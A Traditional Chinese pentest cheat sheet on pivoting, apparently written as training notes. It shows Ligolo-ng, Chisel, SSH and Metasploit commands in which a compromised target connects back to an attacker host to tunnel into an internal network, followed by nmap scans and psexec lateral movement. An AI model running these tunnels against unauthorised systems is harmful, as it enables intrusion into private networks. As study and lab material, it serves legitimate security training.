# 速查：Pivoting

> 原理看 [Ch 38](../38-pivoting.md)。首選 **Ligolo-ng**，備援 Chisel / SSH。

## Ligolo-ng（首選，免 proxychains）

```bash
# --- Kali（一次性）---
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                         # 監聽 11601

# --- 靶機 agent 連回 ---
./agent -connect 10.10.14.5:11601 -ignore-cert       # Linux
agent.exe -connect 10.10.14.5:11601 -ignore-cert     # Windows

# --- proxy 介面 ---
ligolo-ng » session            # 選 agent
[Agent] » ifconfig             # 看內網網段
# 另開終端：把網段路由到 ligolo
sudo ip route add 192.168.1.0/24 dev ligolo
[Agent] » start

# 之後所有工具直連，不用 proxychains！
nmap -sV 192.168.1.10
impacket-psexec corp/user@192.168.1.10

# 把 agent 本機 port 帶回 Kali
[Agent] » listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:1080
```

## Chisel（備援：單一 SOCKS）

```bash
# Kali（server）
./chisel server -p 8080 --reverse
# 靶機（client）
./chisel client 10.10.14.5:8080 R:socks
# Kali 用 proxychains（socks5 127.0.0.1 1080）
proxychains nmap -sV -Pn 192.168.1.10
# 特定 port 轉發
./chisel client 10.10.14.5:8080 R:9090:192.168.1.10:80
```

## SSH（有憑證時最快）

```bash
ssh -L 1234:127.0.0.1:3306 user@target    # 本地轉發（連目標本機服務）
ssh -R 8080:127.0.0.1:80 kali@10.10.14.5  # 遠端轉發（從目標跑）
ssh -D 1080 user@target                    # 動態 SOCKS + proxychains
# Windows 無 ssh client：plink.exe
echo y | plink.exe -ssh -l kali -pw pass -D 1080 10.10.14.5
```

## proxychains 設定

```bash
# /etc/proxychains4.conf 末行
socks5 127.0.0.1 1080
# 用法
proxychains <任何工具>
```

## Metasploit route（有 meterpreter 時）

```
use post/multi/manage/autoroute; set SESSION 1; set SUBNET 192.168.1.0; run
use auxiliary/server/socks_proxy; set VERSION 5; run
```

## 選型

| 情境 | 用 |
|------|----|
| 要掃描/RDP/大量工具、多段網路 | **Ligolo-ng** |
| 只需一條 SOCKS、tun 建不起來 | Chisel |
| 靶機已有 SSH 憑證 | SSH `-L/-R/-D` |

## 鐵律
- Ligolo 讓內網 IP「變本機路由」→ 工具免加 proxychains，速度快
- proxychains + nmap 要加 `-Pn -sT`（SOCKS 不支援 raw/UDP）
- 隧道建好先 `ping`/單一 port 驗證再大動作
